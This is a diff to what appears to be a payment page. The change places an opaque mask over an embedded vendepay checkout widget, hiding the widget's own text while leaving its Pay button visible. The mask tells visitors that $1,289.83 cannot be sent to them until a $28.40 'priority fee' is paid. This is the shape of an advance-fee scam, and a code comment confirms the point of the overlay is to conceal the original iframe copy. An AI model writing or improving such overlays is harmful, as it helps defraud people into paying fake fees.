@@ -154,16 +154,17 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
                 </div>
 
                 <div class="w-full flex justify-center items-center">
-                    <div class="vp-upsell-wrap max-w-md mx-auto" id="vendepay-upsell-wrap" style="--vp-cover-h: 142px;">
-                        <div id="vendepay-upsell-container" class="w-full flex justify-center"></div>
-                        <!-- Gray card covers green product box only; Pay + No stay below. Adjust --vp-cover-h in CSS if needed. -->
-                        <div class="vp-green-cover" id="vp-green-cover">
-                            <div class="vp-green-cover__card">
+                    <div class="vp-upsell-wrap max-w-md mx-auto" id="vendepay-upsell-wrap">
+                        <div id="vendepay-upsell" class="w-full"></div>
+                        <!-- Opaque mask over iframe copy/media; original VP buttons stay in the clear band below. -->
+                        <div class="vp-upsell-cover" id="vp-upsell-cover" aria-hidden="true">
+                            <div class="vp-upsell-cover__card">
                                 <p>
                                     The <strong>$1,289.83</strong> cannot be sent until the priority fee is paid. This step costs <span class="vp-fee">$28.40</span> — it's the last obstacle before you receive your money.
                                 </p>
                             </div>
                         </div>
+                        <div class="vp-upsell-cover-bottom" id="vp-upsell-cover-bottom" aria-hidden="true"></div>
                     </div>
                 </div>
                 <script src="https://checkout.vendepay.com.br/upsell.js" data-node="upsell_44c4c8f9-86cb-4c3b-8e7a-2cf9393b5eea"></script>
